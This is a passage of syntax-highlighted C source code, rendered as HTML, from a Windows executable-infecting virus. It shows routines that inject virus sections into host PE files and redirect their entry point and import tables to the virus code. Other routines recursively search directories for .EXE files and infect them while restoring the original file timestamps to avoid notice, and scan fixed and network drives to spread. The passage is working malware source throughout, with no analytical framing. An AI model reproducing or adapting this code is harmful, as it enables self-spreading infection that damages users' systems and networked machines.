          </span><span class="sc11">StartImports</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">IPEHeader</span><span class="sc10">-&gt;</span><span class="sc11">OptionalHeader</span><span class="sc10">.</span><span class="sc11">DataDirectory</span><span class="sc10">[</span><span class="sc11">IMAGE_DIRECTORY_ENTRY_IMPORT</span><span class="sc10">].</span><span class="sc11">VirtualAddress</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc11">ISection</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">VirtualAddress</span><span class="sc10">;</span><span class="sc0">
          </span><span class="sc11">Imports</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">IMAGE_IMPORT_DESCRIPTOR</span><span class="sc0"> </span><span class="sc10">*)&amp;</span><span class="sc11">Ptr</span><span class="sc10">[</span><span class="sc11">StartImports</span><span class="sc10">];</span><span class="sc0">
          </span><span class="sc5">while</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">Imports</span><span class="sc10">-&gt;</span><span class="sc11">OriginalFirstThunk</span><span class="sc10">)</span><span class="sc0">
          </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc2">// Fix some initialized fields in memory
</span><span class="sc0">            </span><span class="sc11">Imports</span><span class="sc10">-&gt;</span><span class="sc11">TimeDateStamp</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">Imports</span><span class="sc10">-&gt;</span><span class="sc11">ForwarderChain</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc11">Imports</span><span class="sc10">-&gt;</span><span class="sc11">OriginalFirstThunk</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc11">DeltaRVAs</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc11">Imports</span><span class="sc10">-&gt;</span><span class="sc11">Name</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc11">DeltaRVAs</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc11">Imports</span><span class="sc10">-&gt;</span><span class="sc11">FirstThunk</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc11">DeltaRVAs</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc11">DataImports</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">IMAGE_THUNK_DATA</span><span class="sc0"> </span><span class="sc10">*)&amp;</span><span class="sc11">Ptr</span><span class="sc10">[</span><span class="sc11">Imports</span><span class="sc10">-&gt;</span><span class="sc11">OriginalFirstThunk</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc11">SectionRVA</span><span class="sc10">];</span><span class="sc0">
            </span><span class="sc5">do</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
              </span><span class="sc11">DataImports</span><span class="sc10">-&gt;</span><span class="sc11">u1</span><span class="sc10">.</span><span class="sc11">AddressOfData</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">IMAGE_IMPORT_BY_NAME</span><span class="sc0"> </span><span class="sc10">*)((</span><span class="sc11">DWORD</span><span class="sc10">)</span><span class="sc11">DataImports</span><span class="sc10">-&gt;</span><span class="sc11">u1</span><span class="sc10">.</span><span class="sc11">AddressOfData</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">DeltaRVAs</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc5">while</span><span class="sc0"> </span><span class="sc10">((++</span><span class="sc11">DataImports</span><span class="sc10">)-&gt;</span><span class="sc11">u1</span><span class="sc10">.</span><span class="sc11">AddressOfData</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">Imports</span><span class="sc10">++;</span><span class="sc0">
          </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">

        </span><span class="sc11">WriteFile</span><span class="sc10">(</span><span class="sc11">FHandle</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">Ptr</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">Section</span><span class="sc10">[</span><span class="sc11">HostNSections</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">SizeOfRawData</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">BytesRead</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">MEMFREE</span><span class="sc10">(</span><span class="sc11">Ptr</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">Ptr</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">;</span><span class="sc0">
      </span><span class="sc10">}</span><span class="sc0">
      </span><span class="sc11">SectionRVA</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc0"> </span><span class="sc11">Section</span><span class="sc10">[</span><span class="sc11">HostNSections</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">].</span><span class="sc11">Misc</span><span class="sc10">.</span><span class="sc11">VirtualSize</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">PEHeader</span><span class="sc10">.</span><span class="sc11">OptionalHeader</span><span class="sc10">.</span><span class="sc11">SectionAlignment</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc0"> </span><span class="sc10">(-(</span><span class="sc16">long</span><span class="sc10">)</span><span class="sc11">PEHeader</span><span class="sc10">.</span><span class="sc11">OptionalHeader</span><span class="sc10">.</span><span class="sc11">SectionAlignment</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc2">//for
</span><span class="sc0">    
    </span><span class="sc2">// Recalculate Header fields
</span><span class="sc0">    </span><span class="sc11">PEHeader</span><span class="sc10">.</span><span class="sc11">OptionalHeader</span><span class="sc10">.</span><span class="sc11">DataDirectory</span><span class="sc10">[</span><span class="sc11">IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT</span><span class="sc10">].</span><span class="sc11">VirtualAddress</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">PEHeader</span><span class="sc10">.</span><span class="sc11">OptionalHeader</span><span class="sc10">.</span><span class="sc11">DataDirectory</span><span class="sc10">[</span><span class="sc11">IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT</span><span class="sc10">].</span><span class="sc11">Size</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">PEHeader</span><span class="sc10">.</span><span class="sc11">OptionalHeader</span><span class="sc10">.</span><span class="sc11">DataDirectory</span><span class="sc10">[</span><span class="sc11">IMAGE_DIRECTORY_ENTRY_IAT</span><span class="sc10">].</span><span class="sc11">VirtualAddress</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">PEHeader</span><span class="sc10">.</span><span class="sc11">OptionalHeader</span><span class="sc10">.</span><span class="sc11">DataDirectory</span><span class="sc10">[</span><span class="sc11">IMAGE_DIRECTORY_ENTRY_IAT</span><span class="sc10">].</span><span class="sc11">Size</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">PEHeader</span><span class="sc10">.</span><span class="sc11">OptionalHeader</span><span class="sc10">.</span><span class="sc11">DataDirectory</span><span class="sc10">[</span><span class="sc11">IMAGE_DIRECTORY_ENTRY_IMPORT</span><span class="sc10">].</span><span class="sc11">VirtualAddress</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">VirusRVAImports</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">Section</span><span class="sc10">[</span><span class="sc11">HostNSections</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">VirusCodeSection</span><span class="sc10">].</span><span class="sc11">VirtualAddress</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">PEHeader</span><span class="sc10">.</span><span class="sc11">OptionalHeader</span><span class="sc10">.</span><span class="sc11">DataDirectory</span><span class="sc10">[</span><span class="sc11">IMAGE_DIRECTORY_ENTRY_IMPORT</span><span class="sc10">].</span><span class="sc11">Size</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">IPEHeader</span><span class="sc10">-&gt;</span><span class="sc11">OptionalHeader</span><span class="sc10">.</span><span class="sc11">DataDirectory</span><span class="sc10">[</span><span class="sc11">IMAGE_DIRECTORY_ENTRY_IMPORT</span><span class="sc10">].</span><span class="sc11">Size</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">PEHeader</span><span class="sc10">.</span><span class="sc11">OptionalHeader</span><span class="sc10">.</span><span class="sc11">SizeOfImage</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">SectionRVA</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">PEHeader</span><span class="sc10">.</span><span class="sc11">OptionalHeader</span><span class="sc10">.</span><span class="sc11">AddressOfEntryPoint</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">VirusEP</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">Section</span><span class="sc10">[</span><span class="sc11">HostNSections</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">VirusCodeSection</span><span class="sc10">].</span><span class="sc11">VirtualAddress</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">PEHeader</span><span class="sc10">.</span><span class="sc11">FileHeader</span><span class="sc10">.</span><span class="sc11">NumberOfSections</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">HostNSections</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">VirusSections</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">PEHeader</span><span class="sc10">.</span><span class="sc11">OptionalHeader</span><span class="sc10">.</span><span class="sc11">SizeOfCode</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">PEHeader</span><span class="sc10">.</span><span class="sc11">OptionalHeader</span><span class="sc10">.</span><span class="sc11">SizeOfInitializedData</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">PEHeader</span><span class="sc10">.</span><span class="sc11">OptionalHeader</span><span class="sc10">.</span><span class="sc11">SizeOfUninitializedData</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">j</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">j</span><span class="sc10">&lt;</span><span class="sc11">PEHeader</span><span class="sc10">.</span><span class="sc11">FileHeader</span><span class="sc10">.</span><span class="sc11">NumberOfSections</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">j</span><span class="sc10">++)</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
      </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">Section</span><span class="sc10">[</span><span class="sc11">j</span><span class="sc10">].</span><span class="sc11">Characteristics</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc0"> </span><span class="sc11">IMAGE_SCN_CNT_CODE</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc11">PEHeader</span><span class="sc10">.</span><span class="sc11">OptionalHeader</span><span class="sc10">.</span><span class="sc11">SizeOfCode</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc11">Section</span><span class="sc10">[</span><span class="sc11">j</span><span class="sc10">].</span><span class="sc11">SizeOfRawData</span><span class="sc10">;</span><span class="sc0">
      </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">Section</span><span class="sc10">[</span><span class="sc11">j</span><span class="sc10">].</span><span class="sc11">Characteristics</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc0"> </span><span class="sc11">IMAGE_SCN_CNT_INITIALIZED_DATA</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc11">PEHeader</span><span class="sc10">.</span><span class="sc11">OptionalHeader</span><span class="sc10">.</span><span class="sc11">SizeOfInitializedData</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc11">Section</span><span class="sc10">[</span><span class="sc11">j</span><span class="sc10">].</span><span class="sc11">SizeOfRawData</span><span class="sc10">;</span><span class="sc0">
      </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">Section</span><span class="sc10">[</span><span class="sc11">j</span><span class="sc10">].</span><span class="sc11">Characteristics</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc0"> </span><span class="sc11">IMAGE_SCN_CNT_UNINITIALIZED_DATA</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc11">PEHeader</span><span class="sc10">.</span><span class="sc11">OptionalHeader</span><span class="sc10">.</span><span class="sc11">SizeOfUninitializedData</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc11">Section</span><span class="sc10">[</span><span class="sc11">j</span><span class="sc10">].</span><span class="sc11">SizeOfRawData</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc2">// Write new header and section table
</span><span class="sc0">    </span><span class="sc11">SetFilePointer</span><span class="sc10">(</span><span class="sc11">FHandle</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">OfsSections</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">IMAGE_NT_HEADERS</span><span class="sc10">),</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FILE_BEGIN</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">WriteFile</span><span class="sc10">(</span><span class="sc11">FHandle</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">PEHeader</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">IMAGE_NT_HEADERS</span><span class="sc10">),</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">BytesRead</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">WriteFile</span><span class="sc10">(</span><span class="sc11">FHandle</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">Section</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">PEHeader</span><span class="sc10">.</span><span class="sc11">FileHeader</span><span class="sc10">.</span><span class="sc11">NumberOfSections</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">IMAGE_SECTION_HEADER</span><span class="sc10">),</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">BytesRead</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc10">}</span><span class="sc0">

</span><span class="sc11">L_Exit_Infect</span><span class="sc10">:</span><span class="sc0">
  </span><span class="sc2">// Free allocated memory
</span><span class="sc0">  </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">HostRelocs</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">)</span><span class="sc0">
    </span><span class="sc11">MEMFREE</span><span class="sc10">(</span><span class="sc11">HostRelocs</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">Relocations</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">)</span><span class="sc0">
    </span><span class="sc11">MEMFREE</span><span class="sc10">(</span><span class="sc11">Relocations</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">Section</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">)</span><span class="sc0">
    </span><span class="sc11">MEMFREE</span><span class="sc10">(</span><span class="sc11">Section</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">Ptr</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">)</span><span class="sc0">
    </span><span class="sc11">MEMFREE</span><span class="sc10">(</span><span class="sc11">Ptr</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">


</span><span class="sc2">///////////////////////////////////////////
// Recursively search for files to infect
///////////////////////////////////////////
</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">SearchFiles</span><span class="sc10">(</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">Path</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
  </span><span class="sc11">HANDLE</span><span class="sc0"> </span><span class="sc11">FindHandle</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">HANDLE</span><span class="sc0"> </span><span class="sc11">FHandle</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">WIN32_FIND_DATA</span><span class="sc0"> </span><span class="sc11">FindResult</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">FILETIME</span><span class="sc0"> </span><span class="sc11">Time1</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">Time2</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">Time3</span><span class="sc10">;</span><span class="sc0">

  </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">SetCurrentDirectory</span><span class="sc10">(</span><span class="sc11">Path</span><span class="sc10">))</span><span class="sc0">
  </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc2">// Search for EXE files in current directory
</span><span class="sc0">    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">FindHandle</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">FindFirstFile</span><span class="sc10">(</span><span class="sc6">"*.EXE"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">FindResult</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc11">INVALID_HANDLE_VALUE</span><span class="sc10">)</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
      </span><span class="sc5">do</span><span class="sc0">
      </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">FHandle</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">CreateFile</span><span class="sc10">(</span><span class="sc11">FindResult</span><span class="sc10">.</span><span class="sc11">cFileName</span><span class="sc10">,</span><span class="sc0">
                             </span><span class="sc11">GENERIC_READ</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0"> </span><span class="sc11">GENERIC_WRITE</span><span class="sc10">,</span><span class="sc0">
                             </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0">
                             </span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0">
                             </span><span class="sc11">OPEN_EXISTING</span><span class="sc10">,</span><span class="sc0">
                             </span><span class="sc11">FILE_ATTRIBUTE_ARCHIVE</span><span class="sc10">,</span><span class="sc0">
                             </span><span class="sc5">NULL</span><span class="sc0">
                            </span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">FHandle</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc11">INVALID_HANDLE_VALUE</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
          </span><span class="sc11">GetFileTime</span><span class="sc10">(</span><span class="sc11">FHandle</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">Time1</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">Time2</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">Time3</span><span class="sc10">);</span><span class="sc0"> </span><span class="sc2">// Get file time
</span><span class="sc0">          </span><span class="sc11">InfectFile</span><span class="sc10">(</span><span class="sc11">FHandle</span><span class="sc10">);</span><span class="sc0">                          </span><span class="sc2">// Infect file
</span><span class="sc0">          </span><span class="sc11">SetFileTime</span><span class="sc10">(</span><span class="sc11">FHandle</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">Time1</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">Time2</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">Time3</span><span class="sc10">);</span><span class="sc0"> </span><span class="sc2">// Restore file time
</span><span class="sc0">          </span><span class="sc11">CloseHandle</span><span class="sc10">(</span><span class="sc11">FHandle</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
      </span><span class="sc10">}</span><span class="sc0">
      </span><span class="sc5">while</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">FindNextFile</span><span class="sc10">(</span><span class="sc11">FindHandle</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">FindResult</span><span class="sc10">));</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc11">FindClose</span><span class="sc10">(</span><span class="sc11">FindHandle</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc2">// Now search for subdirectories and process them
</span><span class="sc0">    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">FindHandle</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">FindFirstFile</span><span class="sc10">(</span><span class="sc6">"*"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">FindResult</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc11">INVALID_HANDLE_VALUE</span><span class="sc10">)</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
      </span><span class="sc5">do</span><span class="sc0">
      </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">FindResult</span><span class="sc10">.</span><span class="sc11">dwFileAttributes</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc0"> </span><span class="sc11">FILE_ATTRIBUTE_DIRECTORY</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
          </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">DirName</span><span class="sc10">;</span><span class="sc0">

          </span><span class="sc11">DirName</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">_strupr</span><span class="sc10">(</span><span class="sc11">_strdup</span><span class="sc10">(</span><span class="sc11">FindResult</span><span class="sc10">.</span><span class="sc11">cFileName</span><span class="sc10">));</span><span class="sc0">
          </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc0"> 
                </span><span class="sc10">(</span><span class="sc11">memcmp</span><span class="sc10">(</span><span class="sc11">DirName</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"SYSTEM"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">6</span><span class="sc10">))</span><span class="sc0">    </span><span class="sc2">// Skip SYSTEM??
</span><span class="sc0">              </span><span class="sc10">&amp;&amp;</span><span class="sc0">
                </span><span class="sc10">(</span><span class="sc11">FindResult</span><span class="sc10">.</span><span class="sc11">cFileName</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc7">'.'</span><span class="sc10">)</span><span class="sc0">  </span><span class="sc2">// Skip loops with "." and ".."
</span><span class="sc0">             </span><span class="sc10">)</span><span class="sc0">
          </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">SearchFiles</span><span class="sc10">(</span><span class="sc11">FindResult</span><span class="sc10">.</span><span class="sc11">cFileName</span><span class="sc10">);</span><span class="sc0">
          </span><span class="sc10">}</span><span class="sc0">
          </span><span class="sc11">free</span><span class="sc10">(</span><span class="sc11">DirName</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
      </span><span class="sc10">}</span><span class="sc0">
      </span><span class="sc5">while</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">FindNextFile</span><span class="sc10">(</span><span class="sc11">FindHandle</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">FindResult</span><span class="sc10">));</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc11">FindClose</span><span class="sc10">(</span><span class="sc11">FindHandle</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc10">}</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">


</span><span class="sc2">/////////////////////////////////////////////
// Search fixed and network drives to infect
/////////////////////////////////////////////
</span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc11">WINAPI</span><span class="sc0"> </span><span class="sc11">SearchDrives</span><span class="sc10">()</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
  </span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc11">Drives</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">BYTE</span><span class="sc0"> </span><span class="sc11">CurrentDrive</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"A:\\"</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc11">DriveType</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">BYTE</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">;</span><span class="sc0">

  </span><span class="sc11">Drives</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">GetLogicalDrives</span><span class="sc10">();</span><span class="sc0">
  </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">i</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">&lt;</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">DWORD</span><span class="sc10">);</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0">
  </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">Drives</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc4">1</span><span class="sc10">&lt;&lt;</span><span class="sc11">i</span><span class="sc10">))</span><span class="sc0">  </span><span class="sc2">// Drive present?
</span><span class="sc0">    </span><span class="sc10">{</span><span class="sc0">
      </span><span class="sc11">CurrentDrive</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc7">'A'</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">;</span><span class="sc0">
      </span><span class="sc11">DriveType</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">GetDriveType</span><span class="sc10">(</span><span class="sc11">CurrentDrive</span><span class="sc10">);</span><span class="sc0">
      </span><span class="sc2">// Only infect files in Fixed and Network Drives
</span><span class="sc0">      </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">DriveType</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc11">DRIVE_FIXED</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">DriveType</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc11">DRIVE_REMOTE</span><span class="sc10">))</span><span class="sc0">
      </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">SearchFiles</span><span class="sc10">(</span><span class="sc11">CurrentDrive</span><span class="sc10">);</span><span class="sc0">
      </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
  </span><span class="sc10">}</span><span class="sc0">
